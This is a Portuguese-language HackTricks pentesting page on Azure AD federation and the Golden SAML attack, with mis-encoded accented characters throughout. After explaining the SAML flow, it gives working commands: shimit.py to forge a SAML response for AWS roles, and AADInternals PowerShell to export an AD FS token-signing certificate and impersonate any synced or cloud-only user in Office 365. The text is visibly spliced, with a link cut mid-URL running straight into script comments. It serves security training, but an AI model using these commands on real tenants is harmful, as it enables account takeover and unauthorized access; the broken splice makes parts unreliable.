# Federa√ß√£o

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **reposit√≥rios do github.**

</details>

## Informa√ß√µes b√°sicas

**Federa√ß√£o** √© um conjunto de **dom√≠nios** que estabeleceram **confian√ßa**. O n√≠vel de confian√ßa pode variar, mas geralmente inclui **autentica√ß√£o** e quase sempre inclui **autoriza√ß√£o**. Uma federa√ß√£o t√≠pica pode incluir um **n√∫mero de organiza√ß√µes** que estabeleceram **confian√ßa** para **acesso compartilhado** a um conjunto de recursos.

Voc√™ pode **federar seu ambiente local** com o Azure AD e usar essa federa√ß√£o para autentica√ß√£o e autoriza√ß√£o. Esse m√©todo de login garante que toda a **autentica√ß√£o do usu√°rio ocorra localmente**. Esse m√©todo permite que os administradores implementem n√≠veis mais rigorosos de controle de acesso. A federa√ß√£o com **AD FS** e PingFederate est√° dispon√≠vel.

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

Basicamente, na Federa√ß√£o, toda a **autentica√ß√£o** ocorre no ambiente **local** e o usu√°rio experimenta SSO em todos os ambientes confi√°veis. Portanto, os usu√°rios podem **acessar aplicativos em nuvem** usando suas **credenciais locais**.

O **Security Assertion Markup Language (SAML)** √© usado para **trocar** todas as informa√ß√µes de autentica√ß√£o e autoriza√ß√£o entre os provedores.

Em qualquer configura√ß√£o de federa√ß√£o, existem tr√™s partes:

* Usu√°rio ou Cliente
* Provedor de Identidade (IdP):
* Provedor de Servi√ßos (SP)

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. Primeiro, o usu√°rio **tenta acessar um aplicativo** (tamb√©m conhecido como SP, ou Provedor de Servi√ßos), que pode ser um console AWS, cliente da web vSphere, etc. Dependendo da implementa√ß√£o, o cliente pode ir diretamente para o IdP primeiro e pular a primeira etapa neste diagrama.
2. O aplicativo ent√£o **detecta o IdP** (ou Provedor de Identidade, que pode ser AD FS, Okta, etc.) para autenticar o usu√°rio, **gera uma solicita√ß√£o de autentica√ß√£o SAML** e redireciona o cliente para o IdP.
3. O **IdP autentica o usu√°rio**, **cria uma resposta SAML** e a envia para o SP via o usu√°rio.
4. O SP **verifica a resposta SAML** e **registra o usu√°rio**. O SP deve ter um relacionamento de confian√ßa com o IdP. O usu√°rio agora pode usar o servi√ßo.

**Se voc√™ quiser aprender mais sobre autentica√ß√£o SAML e ataques comuns, v√° para:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* O AD FS √© um modelo de identidade baseado em declara√ß√µes.
* "..declara√ß√µes s√£o simplesmente afirma√ß√µes (por exemplo, nome, identidade, grupo), feitas sobre usu√°rios, que s√£o usadas principalmente para autorizar o acesso a aplicativos baseados em declara√ß√µes localizados em qualquer lugar na Internet."
* As declara√ß√µes para um usu√°rio s√£o escritas dentro dos tokens SAML e s√£o ent√£o assinadas para fornecer confidencialidade pelo IdP.
* Um usu√°rio √© identificado por ImmutableID. √â globalmente √∫nico e armazenado no Azure AD.
* O ImmutableID √© armazenado no local como ms-DS-ConsistencyGuid para o usu√°rio e/ou pode ser derivado do GUID do usu√°rio.
* Mais informa√ß√µes em [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Ataque Golden SAML:**

* No ADFS, a resposta SAML √© assinada por um certificado de assinatura de token.
* Se o certificado for comprometido, √© poss√≠vel autenticar no Azure AD como QUALQUER usu√°rio sincronizado com o Azure AD!
* Assim como nosso abuso de PTA, a altera√ß√£o de senha para um usu√°rio ou MFA n√£o ter√° nenhum efeito porque estamos forjando a resposta de autentica√ß√£o.
* O certificado pode ser extra√≠do do servidor AD FS com privil√©gios DA e pode ser usado em qualquer m√°quina conectada √† Internet.
* Mais informa√ß√µes em [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Do esquema anterior, a parte mais interessante √© a terceira, em que o **IdP** gera uma **Resposta SAML** autorizando o usu√°rio a fazer login. Dependendo da implementa√ß√£o espec√≠fica do IdP, a **resposta** pode ser **assinada** ou **criptografada** pela **chave privada do IdP**. Dessa forma, o **SP pode verificar** que a SAMLResponse foi realmente criada pelo IdP confi√°vel.

Semelhante a um [ataque de ticket dourado](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), com a **chave** que **assina** o objeto que cont√©m a **identidade do usu√°rio** e **permiss√µes** (_KRBTGT_ para ticket dourado e chave privada de assinatura de token para SAML dourado), podemos ent√£o **forjar tal "objeto de autentica√ß√£o"** (TGT ou SAMLResponse) e **se passar por qualquer usu√°rio** para obter acesso n√£o autorizado ao SP.

Al√©m disso, os SAMLs dourados t√™m as seguintes vantagens:

* Eles podem ser **gerados** de praticamente **qualquer lugar**. Voc√™ n√£o precisa fazer parte de um dom√≠nio, federa√ß√£o ou qualquer outro ambiente com o qual esteja lidando
* Eles s√£o eficazes mesmo quando **2FA** est√° habilitado
* A **chave privada** de assinatura de token **n√£o √© renovada** automaticamente
* **Alterar** a **senha** de um usu√°rio **n√£o afetar√°** o SAML gerado

#### AWS + AD FS + Golden SAML = ‚ô• (estudo de caso)

[Active Directory Federation Services](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897
# pk - Caminho completo do arquivo de chave privada (formato pem)
# c - Caminho completo do arquivo de certificado (formato pem)
# u - Nome de usu√°rio e dom√≠nio, por exemplo, dom√≠nio\usu√°rio (use \ ou aspas em *nix)
# n - Nome da sess√£o na AWS
# r - Fun√ß√µes desejadas na AWS. Suporta v√°rias fun√ß√µes, a primeira especificada ser√° assumida.
# id - ID da conta da AWS, por exemplo, 123456789012

# Salvar SAMLResponse em um arquivo
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### On-prem -> cloud

```powershell
# Com um usu√°rio de dom√≠nio, voc√™ pode obter o ImmutableID do usu√°rio de destino
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# No servidor AD FS, execute como administrador
Get-AdfsProperties | select identifier

# Ao configurar o AD FS usando o Azure AD Connect, h√° uma diferen√ßa entre IssueURI no servidor ADFS e no Azure AD.
# Voc√™ precisa usar o do AzureAD.
# Portanto, verifique o IssuerURI do Azure AD tamb√©m (Use o m√≥dulo MSOL e precisa de privil√©gios GA)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extrair o certificado de assinatura de token ADFS do servidor ADFS usando o AADInternals
Export-AADIntADFSSigningCertificate

# Impersonar um usu√°rio para acessar aplicativos em nuvem
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```

Tamb√©m √© poss√≠vel criar o ImmutableID de usu√°rios apenas em nuvem e se passar por eles

```powershell
# Crie um ImmutableID realista e defina-o para um usu√°rio apenas em nuvem
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extrair o certificado de assinatura de token ADFS do servidor ADFS usando o AADInternals
Export-AADIntADFSSigningCertificate

# Impersonar o usu√°rio
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```

## Refer√™ncias

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>